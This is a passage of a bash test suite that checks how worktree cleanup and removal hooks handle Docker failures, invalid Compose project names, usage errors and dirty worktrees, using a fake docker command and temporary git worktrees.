  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] && ! grep -q -- " down " "$log" \
    && [[ "$out" == *"WARNING: docker ps failed"*"psfail"* ]]; then
    pass "cleanup-worktree.sh warns, naming the worktree, when docker ps fails"
  else
    fail "docker ps failure (rc=$rc stderr='$out')"
  fi

  # ---- Docker not running: warn, still remove ----
  # Arrange
  make_wt nodaemon
  # Act
  FAKE_DOCKER_DAEMON=down run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] && [[ "$out" == *"WARNING"*"not running"* ]]; then
    pass "cleanup-worktree.sh warns when Docker is not running and still removes the worktree"
  else
    fail "Docker not running (rc=$rc stderr='$out')"
  fi

  # ---- Docker not installed: warn, still remove ----
  if [ -x /usr/bin/docker ] || [ -x /bin/docker ]; then
    skip "docker-not-installed case: docker is in /usr/bin or /bin"
  else
    # Arrange
    make_wt nodocker
    # Act
    TEST_PATH="/usr/bin:/bin" run_hook "$WORKTREE_CLEANUP" "$wt"
    # Assert
    if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] && [[ "$out" == *"WARNING"*"not installed"* ]]; then
      pass "cleanup-worktree.sh warns when docker is not installed and still removes the worktree"
    else
      fail "docker not installed (rc=$rc stderr='$out')"
    fi
  fi

  # ---- Invalid project name: leftover check skipped, folder match still runs ----
  # Arrange
  make_wt badname
  echo "COMPOSE_PROJECT_NAME=bad name!" >"$wt/.env"
  # Act
  FAKE_DOCKER_CONTAINERS="$own" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] \
    && grep -q -- "compose -p wt-badname down " "$log" && ! grep -q -- "volume ls" "$log" \
    && [[ "$out" == *"WARNING"*"COMPOSE_PROJECT_NAME"* ]]; then
    pass "cleanup-worktree.sh warns and skips only the leftover check when COMPOSE_PROJECT_NAME is invalid"
  else
    fail "invalid project name (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Usage errors exit 2 ----
  # Arrange
  make_wt usage
  # Act
  run_hook "$WORKTREE_CLEANUP" --bogus "$wt"
  local flag_rc="$rc"
  run_hook "$WORKTREE_CLEANUP" "$wt" "$wt"
  # Assert
  if [ "$flag_rc" -eq 2 ] && [ "$rc" -eq 2 ] && [ -d "$wt" ]; then
    pass "cleanup-worktree.sh rejects an unknown flag and a second path with exit 2"
  else
    fail "usage errors (flag rc=$flag_rc, two paths rc=$rc)"
  fi
  tgit -C "$repo" worktree remove --force "$wt"

  # ---- Remove hook removes a dirty worktree ----
  # Arrange
  make_wt hook
  echo "discarded" >"$wt/notes.txt"
  printf '{"cwd":"%s"}' "$wt" >"$root/hook-input"
  # The hook resolves symlinks before cleanup (the temp folder sits under
  # one on macOS), so only the resolved path can match; the fake container
  # records that one.
  own="wt-hook	$(cd "$wt" && pwd -P)"
  # Act
  FAKE_DOCKER_CONTAINERS="$own" run_hook "$WORKTREE_REMOVE" <"$root/hook-input"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] && [ -z "$stdout" ] \
    && grep -q -- "compose -p wt-hook down -v --rmi local" "$log"; then
    pass "remove-worktree.sh removes a dirty worktree and its project, with nothing on stdout"
  else
    fail "remove hook on dirty worktree (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Remove hook failure: warns and still exits 0 ----
  # Arrange
  make_wt hookfail
  printf '{"cwd":"%s"}' "$wt" >"$root/hook-input"
  own="wt-hookfail	$(cd "$wt" && pwd -P)"
  # Act
  FAKE_DOCKER_CONTAINERS="$own" FAKE_DOCKER_DOWN_RC=1 run_hook "$WORKTREE_REMOVE" <"$root/hook-input"
  # Assert
  if [ "$rc" -eq 0 ] && [ -z "$stdout" ] \
    && [[ "$out" == *"WARNING"* ]] && [[ "$out" == *"wt-hookfail"* ]]; then
    pass "remove-worktree.sh warns on a failed cleanup and still exits 0"
  else
    fail "remove hook failure (rc=$rc stderr='$out')"
  fi

  cleanup_teardown
  trap - EXIT
}
